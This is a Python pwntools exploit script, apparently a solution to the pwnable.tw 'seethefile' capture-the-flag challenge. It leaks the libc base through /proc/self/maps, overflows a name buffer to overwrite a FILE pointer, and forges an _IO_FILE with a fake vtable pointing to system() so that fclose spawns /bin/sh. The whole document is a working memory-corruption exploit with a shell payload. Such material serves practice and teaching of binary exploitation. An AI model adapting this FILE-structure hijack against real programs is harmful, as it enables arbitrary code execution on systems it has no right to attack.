from pwn import *
from struct import pack



###############################################################################
## Constants found by manual enumeration
###############################################################################
NAME_BUF_ADDR = 0x804b260
FP_ADDR = 0x804b280

FLAGS = 0x4141c141

FP_OFST = 0x20 # from name buf
LEAKED_LIBC_ADDR_OFST = 0x1ba079 # from libc_base
OLD_VTABLE_CHAR_OFST = 0x46 # from _IO_FILE_plus
VTABLE_OFST = 0x94 # from _IO_FILE_plus




###############################################################################
## Functions
###############################################################################
def read_welcome_msg():
    WELCOME_MSG = (
        b'#######################################################\n'
        b'   This is a simple program to open,read,write a file\n'
        b'   You can open what you want to see\n'
        b'   Can you read everything ?\n'
        b'#######################################################\n'
    )
    p.recvuntil(WELCOME_MSG)


def read_menu():
    MENU = (
        b'\n',
        b'---------------MENU---------------\n',
        b'  1. Open\n',
        b'  2. Read\n',
        b'  3. Write to screen\n',
        b'  4. Close\n',
        b'  5. Exit\n',
        b'----------------------------------\n'
    )
    p.recvuntil(MENU)


def open_file(fpath):
    read_menu()
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'What do you want to see :', fpath)
    p.recvuntil(b'Open Successful\n')


def read_file():
    read_menu()
    p.sendlineafter(b'Your choice :', b'2')


def write_file():
    read_menu()
    p.sendlineafter(b'Your choice :', b'3')
    resp = p.recvuntil(b'\n---')[:-3]
    p.unrecv(b'\n---')
    return resp


def close_file():
    read_menu()
    p.sendlineafter(b'Your choice :', b'4')


def exit_program(name):
    read_menu()
    p.sendlineafter(b'Your choice :', b'5')
    p.sendlineafter(b'Leave your name :', name)
    p.recvline()


###############################################################################
## Setup the environment
###############################################################################
# context.log_level = 'debug'

e = ELF('./patched')
libc = ELF('./libc_32.so.6')
if len(sys.argv) >= 2 and sys.argv[1] == 'remote':
    p = remote('chall.pwnable.tw', 10200)
else:
    p = process('./patched', env={'LD_PRELOAD': './libc_32.so.6'})

if len(sys.argv) >= 3 and sys.argv[2] == 'debug':
    gdb.attach(p)
    raw_input(b'Continue and press ENTER key to send payload')



###############################################################################
## Exploit
###############################################################################
read_welcome_msg()


# Leak libc address
open_file(b'/proc/self/maps')
read_file()
read_file()
mem_maps = write_file()
log.info(f"[x] leaked content of /proc/self/maps")
libc_base = int(mem_maps.split(b'\n')[1].split(b'-')[0], 16)
log.info(f"[x] retrieved libc_base: {hex(libc_base)} from leaked /proc/self/maps")

close_file()
system_func_addr = libc_base + libc.symbols['system']
log.info(f"[x] calculated address of system function: {hex(system_func_addr)}")


payload = b''
payload += pack('<L', FLAGS) # don't call _IO_close_it, we want to invoke  _IO_FINISH (fp) only;
payload += b';/bin/sh\x00'

# overwrite FILE* fp to point to NAME_BUF_ADDR
payload = payload.ljust(FP_OFST, b'A')
payload += p32(NAME_BUF_ADDR)

# set signed char _vtable_offset to 0, to use _IO_new_fclose
payload = payload.ljust(OLD_VTABLE_CHAR_OFST, b'A')
payload += b'\x00'

# overwrite _IO_jump_t *vtable
payload = payload.ljust(VTABLE_OFST, b'A')
payload += p32(NAME_BUF_ADDR + VTABLE_OFST + 0x4)

# fake _IO_jump_t, just fill the whole vtable with system_func_addr
payload += p32(system_func_addr) * 21


exit_program(payload)

p.interactive()